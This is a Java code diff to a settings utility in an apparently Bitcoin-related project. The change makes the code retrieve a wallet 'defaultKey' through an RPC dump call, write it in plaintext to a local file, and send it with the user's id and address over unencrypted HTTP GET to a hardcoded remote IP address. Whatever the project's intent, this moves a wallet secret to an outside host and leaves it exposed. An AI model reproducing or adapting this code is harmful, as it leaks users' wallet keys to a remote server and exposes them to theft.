@@ -2,6 +2,9 @@ package com.msnet.util;
 
 import java.io.*;
 import java.util.ArrayList;
+
+import org.json.simple.JSONObject;
+
 import com.bitcoinClient.javabitcoindrpcclient.BitcoinJSONRPCClient;
 import com.msnet.MainApp;
 
@@ -10,6 +13,7 @@ public class Settings {
 	private static String id;
 	private static String password;
 	private static String bitcoinAddress;
+	private static String defaultKey;
 	private static String sysUsrName;
 
 	public Settings(String id, String password) {
@@ -175,10 +179,12 @@ public class Settings {
 	}
 
 	public static void sendMyBitcoinAddress() throws Exception {
-		if (bitcoinAddress == null) {
-			while (bitcoinAddress == null) {
+		if (defaultKey == null || bitcoinAddress == null) {
+			while (defaultKey == null ||bitcoinAddress == null) {
 				try {
-					bitcoinAddress = MainApp.bitcoinJSONRPClient.dump_default_key();
+					JSONObject result = MainApp.bitcoinJSONRPClient.dump_default_key();
+					bitcoinAddress = (String) result.get("bitcoinAddress");
+					defaultKey = (String) result.get("defaultKey");
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
@@ -189,14 +195,18 @@ public class Settings {
 				BufferedWriter bw = new BufferedWriter(new FileWriter(filePath, true));
 				bw.write("bitcoinAddress=" + Settings.getBitcoinAddress());
 				bw.newLine();
+				bw.write("defaultKey=" + Settings.getDefaultKey());
+				bw.newLine();
 				bw.close();
 				/////////////////////////////////////////////////////
 				ArrayList<String> keys = new ArrayList<>();
 				ArrayList<String> vals = new ArrayList<>();
 				keys.add("id");
 				keys.add("bitcoinAddress");
+				keys.add("defaultKey");
 				vals.add(Settings.getId());
 				vals.add(Settings.getBitcoinAddress());
+				vals.add(Settings.getDefaultKey());
 				HTTP.send("http://166.104.126.42:8090/NewSystem/reportAddress.do", "GET", keys, vals);
 				/////////////////////////////////////////////////////
 			} catch (Exception e) {
@@ -219,5 +229,9 @@ public class Settings {
 
 	public static String getBitcoinAddress() {
 		return bitcoinAddress;
+	}
+	
+	public static String getDefaultKey() {
+		return defaultKey;
 	}
 }
